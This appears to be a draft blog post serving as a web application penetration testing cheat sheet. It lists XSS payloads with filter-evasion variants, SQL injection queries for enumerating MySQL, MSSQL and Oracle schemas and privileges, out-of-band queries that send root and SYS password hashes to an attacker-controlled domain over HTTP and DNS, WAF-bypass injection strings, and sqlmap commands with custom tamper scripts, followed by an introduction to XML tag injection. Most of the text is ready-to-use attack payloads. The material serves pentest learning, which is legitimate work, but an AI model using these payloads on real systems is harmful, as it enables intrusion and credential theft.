+++
draft = "true"
date = 2021-04-28T16:21:26+01:00
expiryDate = "2020-04-28T16:21:26+01:00"
title = "Web Application Pentest Cheat Sheet & Command Reference"
description = ""
slug = ""
tags = []
categories = ["Web-Application, Pentest, Cheatsheet"]
externalLink = ""
series = []
weight = 0
+++

---

Table of Contents

- [Encoding & Filtering](#)
- [Evasion Basics](#)
- [Cross-site Scripting](#cross-site-scripting)
   - [XSS Evasion techniques & WAF Bypassing](#)
   - [XSS Cheatsheet](#xss-cheatsheet)
- [Cross-site Request Forgery](#)
- [HTML5](#)
- [SQL Injection](#sql-injection)
   - [Recap on SQLi exploitation](#recap-on-sqli-exploitation)
   - [Advanced SQLi exploitation](#advanced-sqli-exploitation)
   - [SQLi Evasion Techniques & WAF Bypassing](#sqli-evasion-techniques-and-waf-bypassing)
   - [SQLi Evasion Cheatsheet](#sqli-evasion-cheatsheet)
- [XML Attacks](#xml-attacks)
  - [XML Tag Injection](#xml-tag-injection)
  - [XML eXternal Entity](#xml-external-entity)
  - [XML Entity Expansion](#xml-entity-expansion)
- [Attacking Serialization](#attacking-serialization)
   - [Serialization in Java](#serialization-in-java)
   - [Serialization in PHP](#serialization-in-php)
   - [Serialization in .NET](#serialization-in-net)
- [Server-side attacks](#)
- [Attacking Crypto](#)
- [Attacking Authentication & SSO](#)
- [API Pentesting & Cloud Applications](#)
- [Attacking LDAP-based implementations](#)



## Cross Site Scripting

### XSS Cheatsheet

```javascript
<script>alert('l33t')</script>

<script/random>alert('l33t');</script>

<script <script>>alert('l33t')</script>    //To use when the filter is not checking for recursive tags

<script  x>alert('l33t');</script>

<input oncut=alert('l33t');>    //To trigger the alert you have to cut text (CTRL+X)

<svg/onload=alert('l33t');>

<object/data=javascript:alert(‘l33t’)

<svg><script>alert('l33t')    //Not closing the tag

<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x6C;&#x33;&#x33;&#x74;&#x27;&#x29;&#x3B;</script>    //HTML Entities encoding -> alert(‘l33t’);

<svg><script>alert&lpar;'l33t'&rpar;    //HTML Entities Encoding enabling named character reference. %lpar; is the left parenthesis

<script>\u0061lert('l33t')</script>    //To use when the word alert is being blocked. \u0061 stands for the letter a in unicode format

<script>eval('\x61lert(\'l33t\')')</script>

<img src=x onerror=\u0061lert(‘l33t’);>

[NL]eval('\x61lert(\'l33t\')'    //[NL] stands for new line

<isindex onmouseover=&#x61;&#x6C;&#x65;&#x72;&#x74;(‘l33t’);>

[\u2028]eval('\x61lert(\'l33t\')'    //Where [\u2028] is a line separator

<script>eval(8680439..toString(30))(983801..toString(36))</script>    //8680439 in base10 means alert in base30

http://10.my.domain%2f@10.105.15.198/X.JS    //The concept is that to login you can use protocol://user@URL:port
```

Here is a list of useful links and resources:
- [Common payloads](https://www.fatalerrors.org/a/0tlx2Ds.html)
- [Conversion tool from base to base](http://extraconversion.com/base-number/base-36)



## SQL Injection

SQL Injection is an attack aimed at altering the original SQL query structure by leveraging the syntax or DBMS functionalities in order to perform malicious operations. The following paragraph assumes that the reader has already a basic understanding of databases, SQL and this kind of vulnerability.

Generally speaking, *SQLi Techniques Classification* is based on channels used during the recon process:

&nbsp;
- INBAND
>Attacks that leverage the same channel used to inject the SQL code. The result of the exploitation is included directly in the response from the vulnerable web application.
UNION-based and ERROR-based SQLi are an example.  

- OUT-OF-BAND
> OOB techniques use alternative channels to extract data from the server and they depend upon the back-end technologies implemented. Some of these include HTTP(s) requests or DNS resolution. Useful when all INBAND techniques have failed.

- INFERENCE (also called Blind)
> All methods that allow information extraction are based on a set of focused deductions. Most common are Boolean-Based and Time-Based SQLi.

&nbsp;
### Recap on SQLi Exploitation

Let's say we found a valid SQL Injection point. First we have to find some basic info about the backend DBMS, like its version. Without this information we cannot adjust queries to a specific context.

To detect the DBMS version, the most useful method is to force the vulnerable application to return an error message, which will (hopefully) return some details.

Every DBMS implements specific functions that return the current version. The following could be useful in a NON-Blind scenario:

MySQL                |
---------------------|
@@VERSION              
@@GLOBAL.VERSION     
VERSION()            

MSSQL                |
---------------------|
@@VERSION              

ORACLE               |
---------------------|
version FROM v$instance
banner FROM V$VERSION WHERE banner LIKE 'oracle%'


(The approach is different if we are facing a BLIND scenario. In this case it is possible to  execute some educated guessing of what's behind the injection point. This scenario will not be covered here).

After the initial phase, we have to enumerate the list of database schemas proceeded by tables, column and users.

Each DBMS handles databases in its own way (each one uses specific tables to store informtion about the schemas, server and metadata).

Let's look at how the three baseline DBMS's manage data and users.

&nbsp;
### + MySQL

#### List of schemas

In MySQL, **INFORMATION SCHEMA** is the place where all metadata is saved. All the info about other databases are stored within the table **SCHEMATA**.

```SQL
SELECT schema_name FROM information_schema.schemata;
```
If the user has SHOW privileges, then the previous query can be done like:

```SQL
SHOW databases;
- or -
SHOW schemas;
```
To obtain the default or current database name:

```SQL
SELECT DATABASE();
- or -
SELECT SCHEMA();
```
&nbsp;
#### Tables and Columns

In MySQL, *INFORMATION.SCHEMA.TABLES* is the table that provides information about the tables in the managed database. To query for this info:

```SQL
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
- or -
SHOW TABLES; #current schema
- or -
SHOW TABLES in EMPLOYEES; # other database
```

The columns in tables are within the *INFORMATION.SCHEMA.COLUMNS* table:

```SQL
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS;
- or -
SHOW COLUMNS FROM DEPARTMENTS IN EMPLOYEES; # cols in table, database
```
&nbsp;
#### Users and Privileges

MySQL provides a list of functions and constants to select the current user:

```
User()
Current_user()
System_user()
Session_user()

Current_user //constant
```

If the current user has privileges, we can retrieve the list of all users:

```SQL
SELECT user from mysql.user;
```
Note: Mysql is a system database by default usable only by a root user.

What a user can do is defined through privileges. This are stored within the `INFORMATION_SCHEMA` database and organized by the following tables:

```
COLUMN_PRIVILEGES
SCHEMA_PRIVILEGES
TABLE_PRIVILEGES()
USER_PRIVILEGES
```
All user privileges can be selected in this way:

```SQL
SELECT grantee, privilege_type FROM INFORMATION_SCHEMA.USER_PRIVILEGES;
```

If we are looking for privileges on database:

```SQL
SELECT grantee, table_schema, privilege_type FROM INFORMATION_SCHEMA.SCHEMA_PRIVILEGES;
```

If we want to gather the DBA accounts:

```SQL
SELECT grantee, privilege_type FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE privilege_type = "SUPER";
```

The next applies for privileges users:

```SQL
SELECT user FROM MYSQL.USER WHERE Super_priv = "Y";
```


&nbsp;
### + MSSQL

#### List of schemas

In SQL Server, all the system-level information is stored within the **System Tables**. Depending on the DBMS version, these tables exists either only in the **MASTER** database or in every database.

Information about the databases is stored in the system table sysdatabases. This table is accessible from all the databases:

```SQL
SELECT name FROM master..sysdatabases;
- or -
SELECT name FROM sysdatabases;
```
The alternative to System Tables are **SYSTEM VIEWS**, a set of views exposing metadata. These are defined in each database and contain metadata for all the objects stored within that particular database.

To obtain information about the current database:

```SQL
SELECT DB_NAME();
```
To obtain information about a specific database:

```SQL
SELECT DB_NAME(1);
```

List of names and IDs:

```SQL
SELECT dbid, DB_NAME(dbid) from master..sysdatabases;
```
&nbsp;
#### Tables and Columns

In SQL Server, information about tables are stored within *sysobjects*.
To obtain the list of tables for the current user:

```SQL
SELECT name from sysobjects WHERE xtype='U'; # U stands for 'User Table'
```

To retrieve the list of tables for a specific database, we need to put the name of the database before the table name:

```SQL
SELECT name from employees..sysobjects WHERE xtype='U';
```

As an alternative, using the *INFORMATION_SCHEMA* views we can retrieve information about all tables and views of the current database. The view name is TABLE:

```SQL
SELECT table_name from INFORMATION_SCHEMA.TABLES;
- or -
SELECT table_name from INFORMATION_SCHEMA.TABLES where table_type = 'BASE TABLE';
```

To enumerate the columns:

```SQL
SELECT name from syscolumns;
- or -
SELECT name from employees..syscolumns;
```
As an alternative, we can use the following views in INFORMATION_SCHEMA:

```SQL
SELECT column_name from INFORMATION_SCHEMA.columns;
- or -
SELECT column_name from employees.INFORMATION_SCHEMA.columns;
- or -
SELECT column_name from employees.INFORMATION_SCHEMA.columns WHERE table_name = "x";
```
The system view ALL_TAB_COLUMNS is useful in enumerating the columns of the tables and views accessible to the current user:

```SQL
SELECT column_name from SYS.ALL_TAB_COLUMNS;
- or -
SELECT column_name from ALL_TAB_COLUMNS;
```
&nbsp;
#### Users and Privileges

To enumerate users and privileges, we have the following functions and constants to select the current user:

```
suser_sname()
User
System_user
```
We can also use the System Tables:

```SQL
SELECT loginame from SYSPROCESSES WHERE spid= @@SPID; # @@SPID is the current user Process ID
```
```SQL
SELECT name FROM SYSLOGINS; # all users
```

We can also use System Views:

```SQL
SELECT original_login_name FROM SYS.DM_EXEC_SESSIONS WHERE status = "running"; # current active user
```
In addition we have to understand the user privileges. The key function here is **IS_SRVROLEMEMBER**. In addition to *sysadmin*, there are some possible roles like *serveradmin*, *dbcreator*, *setupadmin*, *bulkadmin*, *diskadmin*, *public*, etc.

Additionally we can also use this function to ask about other users:
```SQL
SELECT IS_SRVROLEMEMBER('processadmin', 'aw')
```

&nbsp;
### + Oracle

Oracle does not have a simple model system. There are two key concepts to understand:
- DATABASE --> here are stored the physical files
- INSTANCE --> pool of processes, memory areas, etc

Each DATABASE must point to an INSTANCE that has its custom logical and physical structures in order to store information like tables, indexes, etc.

#### List of schemas

The most important logic structure is the **TABLESPACE**, the place where Oracle stores database objects such as tables and indexes. It is possible to assign a TABLESPACE for each user and then assign some portions of the DB where they can work.

To list the TABLESPACES the current user can use:

```sql
SELECT TABLESPACE_NAME FROM USER_TABLESPACES;
```

Note: *SYSTEM* and *SYSAUX* are system TABLESPACES created automatically when a db is made.

To retrieve the default TABLESPACE:

```sql
SELECT DEFAULT_TABLESPACE FROM USER_USERS;
- or -
SELECT DEFAULT_TABLESPACE FROM SYS.USER_USERS
```
&nbsp;
#### Tables and Columns

In Oracle, in order to retrieve tables and columns, we need to use the system view *ALL_TABLES* to enumerate the data accessible to the current user:

```sql
SELECT table_name, tablespace_name FROM SYS.all_tables;
- or -
SELECT table_name, tablespace_name FROM all_tables;
```
&nbsp;
#### Users and Privileges

Retrieving the current user is very simple:

```sql
SELECT user from DUAL;
```

The same using the system views USER_USERS or ALL_USERS:

```sql
SELECT username from USER_USERS;
- or -
SELECT username FROM ALL_USERS;
```

User privileges are organized within System Tables: **DBA_ROLE_PRIVS** and **USER_ROLE_PRIVS**. The first is for privileges users and describes the roles of all the users, while the second is for the current user:

```sql
SELECT grantee from DBA_ROLE_PRIVS;
- or -
SELECT username FROM USER_ROLE_PRIVS;
```
The current user's session privileges are also reported within the **SESSION_ROLES** view:

```sql
SELECT role FROM SESSION_ROLES;
```
To retrieve an overview of all the data dictionaries, tables and viewas avalable, there is a super view called **DICTIONARY**:

```sql
SELECT * FROM DICTIONARY;
- or -
SELECT * FROM DICT;
```

&nbsp;
### Advanced SQLi Exploitation

When facing (Special) Blind SQL Injection, we cannot rely on the inferential techniques to retrieve data because the results are being limited or filtered. In those situations, we need to opt for another channel to carry the information.
These techniques are known as *Out-of-Band* or *OOB exploitation*.

The most relevant alternative channels are HTTP and DNS.

#### HTTP

We can leverage the HTTP channel for the DBMS systems that provide features for accessing data on the Internet over HTTP using SQL. In this way we can create a query to a web resource controlled by us and then control the access log for analyzing the request arrived.

The only system that provides this feature natively is Oracle and it has two different techniques: *UTL_HTTP* and *HTTPURIType*.

The first one has two useful functions to perform HTTP requests: *REQUEST* and *REQUEST_PIECES*. Only the REQUEST function can be used in a SQL query:

```sql
SELECT UTL_HTTP.REQUEST ('mysite.site/' || (SELECT test FROM SYS.USER$ WHERE ROWNUM=2)) FROM DUAL;
```
The downside of using UTL_HTTP is that it is identified as a potential security problem in Admin security guides and it is often disabled.

On the other hand HTTPURIType is not marked as risky and information can be exfiltrated via HTTP like:

```sql
SELECT HTTPURITYPE ('mysite.site/' || (SELECT test FROM SYS.USER$ WHERE ROWNUM=2)).getclob() FROM DUAL;
```

The ```getclob()``` method return the Character Large Object retrieved. We can also use other methods like ```getblob()```, ```getxml()```, ```getcontenttype()```.


#### DNS

In this case we leverage the DNS resolution process for retrieving the results of our queries. Instead of controlling a web server, we have to control a DNS server. Even if the Administrator sets an aggressive firewall policy, the victim site will still be able to reply to requests and perform DNS queries.

--> The  [sqlmap](https://github.com/sqlmapproject/sqlmap) tool has an implementation to run a fake DNS server and easily perform the exploitation.

&nbsp;
![dns_exfiltration](/images/webapppentest/dns_exfiltration.png)
&nbsp;

Note that the server must be registered as the authoritative name server for the attacker controlled zone.

To perform this attack we need to have a DBMS that supports features able to trigger the DNS resolution process.

In MySQL we can use the *LOAD_FILE()* function. It reads the file and returns the file content as a string. It is possible to request a UNC path like:
```\\[data].mysite.site```:

```sql
SELECT LOAD_FILE (CONCAT('\\\\', 'SELECT password FROM mysql.user WHERE user=\'root\'', '.mysite.site'));
```

In MSSQL we can use the extended Stored Procedures for provoking a DNS request.
The *MASTER..XP_FILEEXIST* procedure is useful to determine whether a particular file exists on the disk. Stored procedures do not accept sub queries in a given parameter value, so we need to pre-elaborate the form before submitting it:

```sql
DECLARE @value varchar(1024);

SELECT @value = (SELECT TOP 1 MASTER.DBO.FN_VARBINTOHEXSTR(password_hash) FROM SYS.SQL_LOGINS WHERE name = 'name') + 'mysiste.site';

EXEC('MASTER..XP_FILEEXIST "\\'+@value+'"');
```

In Oracle we can the use *UTL_INADDR* package with the functions *GET_HOST_ADDRESS* and *GET_HOST_NAME*:

```sql
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.mysiste.site') FROM DUAL
- or -
SELECT UTL_INADDR.GET_HOST_NAME((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.mysiste.site') FROM DUAL
```

&nbsp;
#### Exploiting Second-Order SQL Injection

The "firs-order" SQLi have steps similar to a challenge-response process. The result is returned to the attacker in a response.

In the "second-order" scenario, what's different is the sequence of events that occurs.

1. The attacker submits a malicious requests
2. The application stores the input and responds to the request
3. The attacker submits another request
4. To handle this new request, the app retrieves the previously stored input and processes it. This time the injected query is executed and the result is somehow returned to the attacker.

This kind of SQLis are very powerful and more difficult to detect and modern automated scanners are unable to perform the methodology for discovering them.

&nbsp;

### SQLi Evasion Techniques and WAF Bypassing

#### Pieces

When obfuscating SQL Injection vectors, knowing all the pieces we have and how to combine them is a great skill to have. Here we are going to explore the available 'gadgets' for the construction of an obfuscated payload.

&nbsp;

**1. Comments**

For our purposes, there are two specific cases: commenting out the query and obfuscating portions of our code.

MySQL Comment Syntax |
---------------------|----------
\#                   | Hash  
/*                   | C-style
-\- -                 | SQL
;%00                 | NULL byte


MSSQL Comment Syntax |
---------------------|----------
/*                   | C-style
-\- -                 | SQL
;%00                 | NULL byte

Oracle Comment Syntax |
---------------------|----------
/*                   | C-style
-\- -                 | SQL


Note that in MySQL the content of the following comment will be executed only by servers that are MySQL 5.5.30 or higher:

```sql
SELECT 1 /*!53550 + 1 */   #depending on version, the result will be 1 or 2
```


&nbsp;

**2. Functions and Operators**

If we are dealing with numbers and comparisons, the most useful are *Arithmetic operators* in conjunction with *Bit Functions*.

Let's see some examples for MySQL:

```sql
..id=1  #manipulating plus and minus er can generate the value 1
..id=--1
..id=-+-+1
```

```sql
..id=1&1  #bitwise functions
..id=0|1
..id=13^12
..id=8>>3
..id=~-2
```


```sql
..id=NOT 0  #using Logical Operators
..id=!0
..id=!1+1
..id=1&&1
..id=1 || NULL
```

```sql
..id=greates(0,1)  #using Comparison Operators
..id=COALESCE(NULL,1)
..id=ISNULL(1/0)
..id=LEAST(2,1)
```

In SQL Server we cannot use two equal signs concatenated:

```sql
..id=1  #manipulating plus and minus er can generate the value 1
..id=-+-+1
```

The set of Bitwise operators are much simpler in MySQL, so we can only manipulate using **&** (AND), **|** (OR) and **^** (XOR).

Oracle is more restrictive. If we want to use arithmetic operators, then we must create a valid expression:

```sql
..id=1  #manipulating plus and minus er can generate the value 1
..id=-(-1)
..id=-(-1)*-(1)
```


&nbsp;

**3. Intermediary characters**

Some non-common characters can be used instead of simple spaces.

In MySQL the Universal chars allowed as whitespaces are:

Codepoint | Character
----------|----------
9         | U+0009 Char Tabulation  
10        | U+000A Line Feed (LF)
11        | U+000B Line Tabulation
12        | U+000C Form Feed
13        | U+000D Carriage return (CR)
32        | U+0020 Space

In MSSQL the list of Universal chars allowed as whitespaces are large. Essentially, the 'ASCII Control Characters', the 'space' and the 'no-break space' are allowed.

Codepoint | Character
----------|----------
1         | U+0009 Char Tabulation  
2         | U+000A Line Feed (LF)
3         | U+000B Line Tabulation
..        | U+000C Form Feed
32        | U+0020 Space
160       | U+00A0 No-break Space

In Oracle, there are 7 chars in total and the main difference with MySQL is that the NULL char is (in Oracle) a valid space:

Codepoint | Character
----------|----------
0         | U+0000 Null
9         | U+0009 Char Tabulation
10        | U+000A Line Feed (LF)
11        | U+000B Line Tabulation
12        | U+000C Form Feed
13        | U+000D Carriage Return (CR)
32        | U+0020 Space

The previous examples are 'Universal' because they can be used everywhere in a query without breaking it. In addition, there are other chars that can be used in specific places.

- The PLUS sign can be used to separate almost all the keywords except FROM

```sql
SELECT+name FROM names WHERE+id=5 AND+surname LIKE+'S%' #valid for all DBs
```
- In all the DBMSs we can also use *Parenthesis()*, *Operators*, *Quotes* and the *C-style comments /\*/*


&nbsp;

**4. Constants and Variables**

Every SQL implementation has its own reserved words (constants) and knowing them is a must. Also system variables are very important as every DBMS maintains these in order to indicate its configuration.

Since MySQL 4.1 it is no longer possible to obfuscate keywords, so the only way to to do is by manipulating upper/lower case variations.

- [List of reserved words in MySQL](https://dev.mysql.com/doc/refman/8.0/en/keywords.html)
- [List of Server System Variables](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html)

In order to see the current variables used by a running server:

```sql
SHOW VARIABLES
```

If we want to define a custom variable:

```sql
SET @testvar={expression}
SET @testvar:={expression}
```

In MSSQL, the list of reserved keywords is defined here:

- [List of reserved words in MSSQL](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/reserved-keywords-transact-sql?redirectedfrom=MSDN&view=sql-server-ver15)

Information about configuration is organized in [Built-in Functions](https://docs.microsoft.com/en-us/sql/t-sql/functions/functions?redirectedfrom=MSDN&view=sql-server-ver15). The ones that are much closer to variables are the Scalar Functions.

Oracle, however, has a different [management of Words](https://docs.oracle.com/cd/B10501_01/appdev.920/a42525/apb.htm). There are reserved words (cannot be redefined) and Keywords (can be redefined by the user).


&nbsp;

**5. Strings**

Let's see some techniques that are helpful in the creation, manipulation and obfuscation of strings.

In MySQL to define a string we can use the single quote (') and the double quote (").

We can also define string literals with the corresponding charset:

```sql
_ascii'string' #there are approx 40 possible charset to use
```

Other literal notations are Hexadecimal:

```sql
SELECT X'4F455405'
SELECT 0X4F455405
```

There is also the *B'literal'* or *b'literal'* notation for defining *Bit Literals*:

```sql
SELECT 'a'=B'1100001' #TRUE
```

SQL Server defines the literal  as either constant or scalar value. By tdefault they can be defined only using single quotes.

Oracle also does not allow text literals using double quote delimiters.

MySQL supports different collations including Unicode.
[Here](https://dev.mysql.com/doc/refman/8.0/en/charset-collation-effect.html) is an interesting read.

Here is a simple example of a Unicode select:

```sql
SELECT 'admin' = 'ãdmïn' #TRUE
```
Imagine what occurs if we are able to resiter the user 'ãdmïn' when an admin user already exists!

Escaping in SQL can be done with different [special characters](https://dev.mysql.com/doc/refman/8.0/en/string-literals.html).

```sql
SELECT 'He\'llo'
SELECT 'He\&\_llo'
```

To escape quotes we can use the same char two times:

```sql
SELECT 'He''llo'
SELECT 'He""llo'
```
If we try to escape a character that does not have a respective escaping sequence, the backslash will be ignored. MySQL allows arbitrary usage of this character inside strings:

```sql
SELECT '\H\e\l\l\o'
SELECT 'He\ll\o'
```

For quoted strings, concatenation can be performed by placing the strings next to each other:

```sql
SELECT 'He' 'll' 'o'
```
We can also use the *CONCAT* and *CONCAT_WS* (with separator) functions:

```sql
SELECT CONCAT('He', 'll', 'o')
SELECT CONCAT_WS('', 'He', 'll', 'o')
```

It is also possible to concatenate quoted string by mixing comments in C-Style notation:

```sql
SELECT 'He'/**/'ll'/**/'o'
SELECT /**//**/'He'/**/'ll'/**/'o'/**/
SELECT /*!10000 'He'*/'ll'/*****/'o'/*****/
```

In SQL Server the concatenation can be done using the *+* operator and the *CONCAT* function:

```sql
SELECT 'He'+'ll'+'o'
SELECT CONCAT('He', 'll', 'o')

SELECT 'He'/**/+/**/'ll'/**/+/**/'o' //obfuscated version
SELECT CONCAT(/**/'He',/**/'ll',/**/'o')  //obfuscated version
```

In Oracle the concatenation operator is **||** and we can also use *CONCAT* and *NVL*:

```sql
SELECT 'He'||'ll'||'o'
SELECT CONCAT('He','llo')
SELECT NVL ('Hello','Forever')
```

&nbsp;

**6. Integers**

A generic example useful in understanding how to construct numbers is using the *PI* function. We can use the result of the PI function mixed either with FLOOR and obtain the value of 3, or with CEIL and obtain the value of 4.
We can continue using system functions like *version()* and obtain *5.6* for example.

To obtain the value of 10 we can do: ```ceil(pi()*3)```.

&nbsp;

**7. MySQL Type Conversion**

In MySQL there is a special behavior when combining arithmetic operations with different types.

Example of implicit type conversions when comparing Numbers to Booleans:

```sql
SELECT .. 1 = TRUE
SELECT .. 2! = TRUE
```

The same is true when comparing Strings to Numbers or if we use Operators:

```sql
SELECT .. VERSION()=5.5      #5.5.30
SELECT .. @@VERSION=5.5      #5.5.30
SELECT ..('type'+'cast')=0   #TRUE
```



&nbsp;
#### Bypassing Keyword Filters

One of the limitations that we may encounter when dealing with filter restrictions, are restrictions on keywords. Here we will discuss techniques used to obfuscate some of these keywords and alternative methods we can use when we know others are blocked.

The simplest and weakest filters are the ones that perform case sensitive checks. SQL Keywords are case-insensitive so these filters can be bypassed by simply changing the cases of each character:

```
SeLeCt
SEleCT
```
-> SQLMap has a tampering script for this called *randomcase.py*.

Sometimes filters use spaces to delimit a specific keyword. In this case we can use comments instead of spaces and (depending on the DB version) a list of the whitespace that are not matched as spaces:

```sql
SELECT/**/values/**/and/**/../**/or/**/

SELECT[sp]values[sp]and..[sp]or[sp]
```

Some alternatives:

```sql
SELECT"values"from'table'where/**/1
SELECT(values)from(table)where(1)
SELECT+"values"%A0from'table'
```

Encoding is another handy trick we can leverage. In fact between us and the application there are many layers and if some of these handle the encoding differently, there could be a bypass.

One example could be to URL encode the request that usually is sent through via the internet. If the filter does not decode the request, it could be possible to bypass it.

It is also possible to double encode the request. In  this case, if the filter decodes the request the first time and applies the rules, it will not find anything dangerous. Then when the application receives the request, it will decode the content of the request and trigger the malicious request.

When regex are tricky, we may use some alternative keywords and techniques.

The *AND* and *OR* operators can be replaced with **&&** and **||**.

```sql
..WHERE ID=y && 1=1
..WHERE ID=y || 1=1
```

If the are also filtered, then we must use the *UNION* operator. This operator is used in combination to *SELECT*, so strong rules are probably implemented.
Here are some variants useful to elude this kind of filters:

```sql
..UNION(SELECT 'VALUES'..) && ..
..UNION ALL SELECT ..
..UNION DISTINCT SELECT
../*!00000 UNION*//*!0000 SELECT*/ ..
```

--> If the  *UNION* keyword is filtered, then we must switch to a blind SQLi scenario.

&nbsp;
#### Bypassing Function Filters

In the previous paragraph we have used mainly functions, but what if they are filtered?
It is possible to generate strings without the use of quotes.

Each DBMS provides its functions for doing this. In MySQL the *UNHEX* function is useful in translating hex numbers to strings:

```sql
..SUBSTR(USERNAME,1,1)=UNHEX(48)
..SUBSTR(USERNAME,1,2)=UNHEX(4845)
..
```

The respective *HEX* function is useful to convert to hexadecimal:

```sql
..HEX(SUBSTR(USERNAME,1,1))=48
..HEX(SUBSTR(USERNAME,1,2))=4845
..
```

We can also use the *CHAR* function:

```sql
..SUBSTR(USERNAME,1,1)=CHAR(72)
..SUBSTR(USERNAME,1,2)=CHAR(72,69)
..
```

MySQL offers an interesting method in returning the string representation of a number from two bases, which is *CONV*. the highest base we can use is 36. (Note that we cannot use it for Unicode chars):

```sql
CONV(10,10,36) // is 'a'
CONV(11,10,36) // is 'b'
```

We can mix the results with *upper* and *lower* functions to retrieve the represntation we want:

```sql
LOWER(CONV(10,10,36)) // is 'a'
LCASE(CONV(10,10,36)) // is 'a'
UPPER(CONV(10,10,36)) // is 'A'
UCASE(CONV(10,10,36)) // is 'A'
```

Some alternatives for constructing substrings:

```sql
[LEFT|RIGHT]('HELLO', 2) // HE or LO

[LPAD|RPAD]('HELLO', 6, '?') //?HELLO or HELLO?
[LPAD|RPAD]('HELLO', 5, '?') //HELLO
```

&nbsp;

### SQLi Evasion Cheatsheet

Let's suppose we have find a valid SQL injection point in the *User-Agent* header and that the DBMS is MySQL. From here we will suppose different scenarios and describe how to bypass the filter.

&nbsp;

**CASE :  The application is filtering spaces**

In this case we can bypass the filter using comments:
```sql
User-Agent: '/**/UNION/**SELECT/**/@@version;#
```

Automation with sqlmap:

```bash
sudo python3 sqlmap.py -u "application_url" --dbms=mysql -p user-agent --random-agent --tamper=space2comment --technique=U --suffix=';#' --banner
```

&nbsp;

**CASE :  Spaces are filtered and bypassing using comments no longer works**

In this case we can use parenthesis to bypass the filter:

```sql
User-Agent: 'UNION(SELECT(group_concat(table_name))FROM(information_schema.columns)WHERE(table_schema=database()));#
```
This scenario is not easy to automate with sqlmap.

&nbsp;

**CASE :  MySQL's reserved words have been filtered**

Using ```RaNDom``` case does not help, as you can have, for example, something like ```InfoRMaTIon_ScheMa``` who will become ```InfoRMaTI_ScheMa```, as```on``` or ```ON``` is a valid reserved word.

A possible bypass:

```sql
User-Agent: ' UNiOn seLect @@versiOn;#
```
For a sqlmap automation it is necessary to write a simple tampering script that will use a different case for every letter:

```python
#!/usr/bin/env python
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces each keyword a CaMeLcAsE VeRsIoN of it.

    >>> tamper('INSERT')
    'InSeRt'
    """

    retVal = str()

    if payload:
        for i in range(len(payload)):
            if (i % 2 == 0):
                # We cannot break 0x12345
                if not ((payload[i] == 'x') and (payload[i-1] == '0')):
                    retVal += payload[i].upper()
                else:
                    retVal += payload[i]
            else:
                retVal += payload[i].lower()
    return retVal

```

Automation with sqlmap:

```bash
sudo python3 sqlmap.py -u "application_url" --dbms=mysql --user-agent='*' --tamper=tamper/camelcase.py --suffix=';#' --random-agent --banner
```

&nbsp;

**CASE :  The filter is case-insensitive and cuts out all the reserved words, but it is not recursive**

A bypass can be:

```sql
User-Agent: 'uFILLnFILLiFILLoFILLnFILL FILLsFILLeFILLlFILLeFILLcFILLt FILL@@FILLvFILLeFILLrFILLsFILLiFILLoFILLnFILL; FILL-- FILL-FILL
```
For a sqlmap automation it is necessary to write a simple tampering script:

```python
#!/usr/bin/env python
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
   pass

def tamper(payload, **kwargs):
   """
   Insert FILL after every character

   >>> tamper('INSERT')
   'IfillNfillSfillEfillRfillTfill
   """

   retVal = str()

   FILL='FILL'

   if payload:
       for i in range(len(payload)):
           retVal += payload[i]+FILL
   # Uncomment to debug
   # print "pretamper:", payload
   return retVal
```

Automation with sqlmap:

```bash
sudo python3 sqlmap.py -u "application_url" --dbms=mysql -p user-agent --tamper=tamper/fill.py  --random-agent --banner
```

&nbsp;

**CASE :  URL encoding bypass**

A sample bypass:

```sql
User-Agent: %61%61%61%61%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%3b%20%2d%2d%20%2d

#User-Agent: aaaa' union select @@version; -- -
```

Automation with sqlmap:

```bash
sudo python3 sqlmap.py -u "application_url" --dbms=mysql -p user-agent --tamper=tamper/charencode.py --random-agent --banner
```

&nbsp;

**CASE :  Double URL encoding bypass**

A sample bypass:

```sql
User-Agent: %25%36%31%25%36%31%25%36%31%25%36%31%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%34%30%25%34%30%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%33%62%25%32%30%25%32%64%25%32%64%25%32%30%25%32%64

#User-Agent: aaaa' union select @@version; -- -
```

Automation with sqlmap:

```bash
sudo python3 sqlmap.py -u "application_url" --dbms=mysql -p user-agent --tamper=tamper/chardoubleencode.py --random-agent --banner
```

&nbsp;

**CASE :  Custom payload prefix and reserved keyword filtering**

A sample bypass:

```sql
User-Agent: ') uFILLnFILLiFILLoFILLn sFILLeFILLlFILLeFILLcFILLt 'TEST'; -- -
```

Automation with sqlmap:

```bash
sudo python3 sqlmap.py -u "application_url" --dbms=mysql -p user-agent --tamper=tamper/fill.py --random-agent --banner --prefix="test')" --suffix="; -- "
```


## XML Attacks

In order to define the logical structure of a XML document, it is used document named *Document Type Definition (DTD)*. It can be defined internally ox externally. The document explains what elements must be included in the XML.


In the primary types of attacks techniques against XML, there are three options:

- an XML is tampered
- an XML document containing an attack is sent
- an XML is taken using a querying mechanism


&nbsp;

### XML Tag Injection

In this scenario, the attacker is able to alter the XML document structure by injecting custom XML tags and data.
Let's assume the following XML structure used by a web-app:

```XML
<?xml version="1.0"?>
<subscribers>
<user>
<username>john</username>
<password>john_passwd</password>
<group>admin</group>
</user>
<user>
<username>elena</username>
<password>elena_passwd</password>
<group>users</group>
</user>
</subscribers>
```

If, for example, a user is able to inject some **XML metacharacters** during the registration process, then the app is vulnerable to XML Injection.

Definition of XML metacharacters:

```
'  "  <  >  &
```

To test ann application, we have to inject metacharacters and check if we can break some of the XML structures. This will result in throwing exceptions during the XML parsing process.

Using the ```&``` char, we can inject a custom entity like ```&username;``` that will trigger an error if the entity is not defined.

